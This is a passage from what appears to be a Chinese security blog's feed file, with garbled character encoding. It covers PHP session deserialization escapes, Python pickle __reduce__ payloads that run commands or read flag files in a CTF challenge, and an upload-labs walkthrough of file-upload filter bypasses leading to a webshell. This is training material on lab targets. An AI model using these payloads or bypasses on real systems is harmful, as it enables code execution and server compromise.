highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯å…³é”®è¯å‡å°‘çš„è¯æœ‰ä¸¤ç§åŠæ³•</p>
<p><strong>å€¼é€ƒé€¸</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=p<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;s:2:&quot;</span>a<span class="string">b&quot;;s:2:&quot;</span>s<span class="string">b&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¿™é‡Œæ˜¯é¢˜ç›®æ­£å¸¸ååºåˆ—åŒ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬postä¸Šä¼ åºåˆ—åŒ–å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">60</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ab&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;sb&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°24ç›´æ¥æŠŠ<code>&quot;;s:8:&quot;function&quot;;s:60:&quot;p</code>åŒ…å«è¿›å»äº†ï¼Œæ‰€ä»¥åé¢çš„imgå¯ä»¥é€ƒé€¸å‡ºæ¥è¯»flagã€‚</p>
<p><strong>é”®é€ƒé€¸</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬postä¸Šä¼ åºåˆ—åŒ–å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">49</span>:<span class="string">&quot;;s:2:&quot;</span>d<span class="string">b&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°7ç›´æ¥æŠŠ<code>&quot;;s:49:</code>åŒ…å«è¿›å»äº†ï¼Œåé¢çš„imgå¯ä»¥é€ƒé€¸å‡ºæ¥è¯»flagã€‚</p>
<h1 id="pythonååºåˆ—åŒ–"><a href="#pythonååºåˆ—åŒ–" class="headerlink" title="pythonååºåˆ—åŒ–"></a><strong>pythonååºåˆ—åŒ–</strong></h1><p>è¿™é‡Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7751#toc-1">https://xz.aliyun.com/t/7751#toc-1</a></p>
<p><code>python</code>ä¸­åºåˆ—åŒ–ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š<code>pickle</code>æ¨¡å—å’Œ<code>json</code>æ¨¡å—ï¼Œå‰è€…æ˜¯<code>python</code>ç‰¹æœ‰çš„æ ¼å¼ï¼Œåè€…æ˜¯<code>json</code>é€šç”¨çš„æ ¼å¼ã€‚</p>
<p>ä»¥ä¸‹å‡æ˜¾ç¤ºä¸º<code>python2</code>ç‰ˆæœ¬åºåˆ—åŒ–è¾“å‡ºç»“æœï¼Œ<code>python3</code>çš„<code>pickle.dumps</code>ç»“æœä¸<code>python2</code>ä¸ä¸€æ ·ã€‚</p>
<ul>
<li>pickle</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = pickle.dumps(dict)</span><br><span class="line">print(a, type(a))</span><br><span class="line">b = pickle.loads(a)</span><br><span class="line">print(b, type(b))</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&quot;(dp0\nS&#x27;age&#x27;\np1\nI19\nsS&#x27;name&#x27;\np2\nS&#x27;kawhi&#x27;\np3\ns.&quot;</span>, &lt;type <span class="string">&#x27;str&#x27;</span>&gt;)</span><br><span class="line">(&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kawhi&#x27;</span>&#125;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>json</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = json.dumps(dict, indent=<span class="number">4</span>)</span><br><span class="line">print(a, type(a))</span><br><span class="line">b = json.loads(a)</span><br><span class="line">print(b, type(b))</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;&#123;\n    &quot;age&quot;: 19, \n    &quot;name&quot;: &quot;kawhi&quot;\n&#125;&#x27;</span>, &lt;type <span class="string">&#x27;str&#x27;</span>&gt;)</span><br><span class="line">(&#123;<span class="string">u&#x27;age&#x27;</span>: <span class="number">19</span>, <span class="string">u&#x27;name&#x27;</span>: <span class="string">u&#x27;kawhi&#x27;</span>&#125;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸€ä¸ªpickleæ¨¡å—å¯¼è‡´çš„å®‰å…¨é—®é¢˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (a, ))</span><br><span class="line"></span><br><span class="line">r = pickle.dumps(obj())</span><br><span class="line">print(r)</span><br><span class="line">pickle.loads(r)</span><br></pre></td></tr></table></figure>

<p>å…ˆè¾“å‡º<code>obj</code>å¯¹è±¡çš„åºåˆ—åŒ–ç»“æœï¼Œå†å°†å…¶ååºåˆ—åŒ–ï¼Œè¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt</span><br><span class="line">system</span><br><span class="line">p0</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">p1</span><br><span class="line">tp2</span><br><span class="line">Rp3</span><br><span class="line">.</span><br><span class="line">desktop-t6u2ptl\think</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‰§è¡Œäº†whoamiå‘½ä»¤ã€‚</p>
<p>è¿™é‡ŒåŒæ ·é€šè¿‡ä¸€é“é¢˜æ¥ç†è§£ï¼Œbuuä¸Šé¢çš„[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</p>
<p>å‰é¢çš„æ“ä½œæ˜¯é€šè¿‡JWTè·å–åˆ°æºç ï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>ç¬¬<code>19</code>è¡Œå¤„ç›´æ¥æ¥æ”¶<code>become</code>ç»<code>url</code>è§£ç ä¸å…¶ååºåˆ—åŒ–çš„å†…å®¹ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ <code>payload</code>è¯»å–<code>flag.txt</code>æ–‡ä»¶ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>ä¼ å‚ç»™becomeå³å¯æ‹¿åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/05/04/upload-labs/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h4><p>ç»ƒä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œé¡¹ç›®åœ°å€ï¼š<a class="foo" href="https://github.com/c0ny1/upload-labs" target="_blank">ä¼ é€é—¨</a></p>
<h4 id="Pass-01-jsæ£€æŸ¥"><a href="#Pass-01-jsæ£€æŸ¥" class="headerlink" title="Pass-01(jsæ£€æŸ¥)"></a><strong>Pass-01(jsæ£€æŸ¥)</strong></h4><p>å‰ç«¯jsæ£€æŸ¥ï¼š</p>
<p>1.é¦–å…ˆæ‰“å¼€burpå’Œæµè§ˆå™¨</p>
<p>2.ä¸Šä¼ 1.phpæ–‡ä»¶è¿›è¡Œè§‚å¯Ÿ</p>
<p>3.è¿™é‡Œå‘ç°ï¼Œhttpè¯·æ±‚éƒ½æ²¡é€šè¿‡burpå°±å¼¹å‡ºäº†ä¸å…è®¸ä¸Šä¼ çš„æç¤ºæ¡†ï¼Œè¿™è¡¨æ˜éªŒè¯ç‚¹åœ¨å‰ç«¯ï¼Œè€Œä¸åœ¨æœåŠ¡ç«¯</p>
<img src="http://img.kawhi.xyz/image-20200502124534442.png" style="high:100%;width:100%;" />

<p>è¿™é‡Œå¯ä»¥æŒ‰F12æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == null || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line">    var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        var errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šä¼ ä¹‹å‰ï¼Œé€šè¿‡jsåˆ¤æ–­ä¸€ä¸‹æ–‡ä»¶åç¼€æ˜¯å¦ä¸º<code>.jpg</code>|<code>.png</code>|<code>.gif</code>,ä¸æ˜¯å°±ä¸å…è®¸ä¸Šä¼ ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>å‰ç«¯jséªŒè¯çš„ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸Šä¼ çš„phpæ–‡ä»¶æ”¹åç¼€åä¸º<code>jpg</code>|<code>png</code>|<code>gif</code>,ç»•è¿‡jséªŒè¯åï¼Œå†ç”¨burpæ›´æ”¹ä¸Šä¼ è¯·æ±‚ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200502125214737.png" style="high:100%;width:100%;" />

<p>ç„¶åå†ç‚¹forwordæ”¾è¡Œè¯·æ±‚ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200502125346077.png" style="high:30%;width:30%;" />

<p>å¯ä»¥çœ‹åˆ°<code>1.php</code>å·²ç»æˆåŠŸä¸Šä¼ ã€‚</p>
<p>å†ç”¨èšå‰‘è¿æ¥å³å¯ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200502125541669.png" style="high:100%;width:100%;" />

<h4 id="Pass-02-éªŒè¯Content-type"><a href="#Pass-02-éªŒè¯Content-type" class="headerlink" title="Pass-02(éªŒè¯Content-type)"></a><strong>Pass-02(éªŒè¯Content-type)</strong></h4><p>çœ‹æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åç«¯phpä»£ç åªå¯¹<code>Content-Type</code>è¿›è¡Œäº†æ£€æŸ¥ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>ç›´æ¥åœ¨burpä¿®æ”¹<code>content-type</code>ä¸ºå…è®¸çš„ç±»å‹ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200502180337105.png" style="high:100%;width:100%;" />

<h4 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03(é»‘åå•ç»•è¿‡)"></a><strong>Pass-03(é»‘åå•ç»•è¿‡)</strong></h4><p>é¦–å…ˆçœ‹ä¸€ä¸‹æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯åšäº†ä¸€ä¸ªé»‘åå•è¿‡æ»¤ï¼Œè¿‡æ»¤äº† <code>asp</code>ã€<code>aspx</code>ã€<code>php</code>ã€<code>jsp</code>ç­‰åç¼€ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p>
<p>å¯ä»¥ä¸Šä¼ åç¼€ä¸ºï¼š<code>.phtml</code>ï¼Œ <code>.phps</code> ï¼Œ<code>.php5</code>ï¼Œ <code>.pht</code>ã€‚ä½†æ˜¯å¦‚æœæ˜¯è¿™ç§ç±»å‹ï¼Œæƒ³è¦è¢«å½“æˆphpæ‰§è¡Œçš„è¯ï¼Œéœ€è¦æœ‰ä¸ªå‰ææ¡ä»¶ï¼Œå³Apacheçš„<code>httpd.conf</code>æœ‰å¦‚ä¸‹é…ç½®ä»£ç ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>

<p>åœ¨phpstudyé‡Œé¢è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥è¿ä¸Šèšå‰‘äº†ã€‚</p>
<p>ä¹Ÿå¯ä»¥æ„é€ .htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹:<code>AddType application/x-httpd-php .jpg</code><br> è¿™é‡Œä»£ç çš„æ„æ€å¯ä»¥è®© .jpgåç¼€åæ–‡ä»¶æ ¼å¼çš„æ–‡ä»¶åä»¥phpæ ¼å¼è§£æï¼Œå› æ­¤è¾¾åˆ°äº†å¯æ‰§è¡Œçš„æ•ˆæœã€‚æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¦ä¸Šä¼ çš„phpæ–‡ä»¶çš„åç¼€åæ”¹ä¸º.jpgæ ¼å¼ä»è€Œç»•è¿‡ã€‚</p>
<h4 id="Pass-04-htaccessç»•è¿‡"><a href="#Pass-04-htaccessç»•è¿‡" class="headerlink" title="Pass-04(.htaccessç»•è¿‡)"></a><strong>Pass-04(.htaccessç»•è¿‡)</strong></h4><p>æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span 